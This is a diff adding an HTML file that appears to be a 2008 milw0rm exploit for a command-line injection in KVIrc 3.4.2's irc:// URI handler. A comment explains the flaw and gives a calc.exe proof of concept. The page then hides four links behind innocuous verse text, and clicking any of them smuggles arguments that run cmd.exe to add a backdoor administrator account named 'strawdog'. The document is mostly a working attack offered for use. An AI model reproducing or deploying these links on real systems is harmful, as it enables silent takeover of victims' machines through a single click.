@@ -1,0 +1,37 @@
+<!--
+KVIrc 3.4.2 Shiny (uri handler) remote command execution exploit
+by Nine:Situations:Group::strawdog
+Tested against IE8beta/WINxpsp3
+
+software site:
+http://www.kvirc.net/?lang=en
+description:
+"KVIrc is a Multilanguage, graphical IRC-Client for Windows, Linux, Unix and Mac
+OS.[..]"
+
+A command line parsing vulnerability exists (or I should say persists...:
+http://secunia.com/advisories/25740, fixed or not?) which can be exploited by
+passing the '"' char followed by command line switches to 'irc:///', 'irc6:///',
+'ircs:///' and 'ircs6:///' urls, ex. this shows the argument list:
+irc:///"%20--help%20"
+The most interesting one is the -e switch followed by 'run' command, this runs
+calc.exe:
+irc:///"%20--nosplash%20-e%20"run%20calc"%20"
+
+The following links add a new user on target with admin privileges
+-->
+<html>
+  <body>
+
+  <a href='irc:///"%20--nosplash%20-e%20"run%20cmd.exe%20/c%20net%20user%20strawdog%20pass%20/add%20&%20net%20localgroup%20Administrators%20strawdog%20/add"%20"'>Heaven and Earth are impartial</a><br>
+
+  <a href='irc6:///"%20--nosplash%20-e%20"run%20cmd.exe%20/c%20net%20user%20strawdog%20pass%20/add%20&%20net%20localgroup%20Administrators%20strawdog%20/add"%20"'>They see the ten thousand things as straw dogs</a><br>
+
+  <a href='ircs:///"%20--nosplash%20-e%20"run%20cmd.exe%20/c%20net%20user%20strawdog%20pass%20/add%20&%20net%20localgroup%20Administrators%20strawdog%20/add"%20"'>The wise are impartial</a><br>
+
+  <a href='ircs6:///"%20--nosplash%20-e%20"run%20cmd.exe%20/c%20net%20user%20strawdog%20pass%20/add%20&%20net%20localgroup%20Administrators%20strawdog%20/add"%20"'>They see the people as straw dogs</a><br>
+
+  </body>
+</html>
+
+# milw0rm.com [2008-11-21]
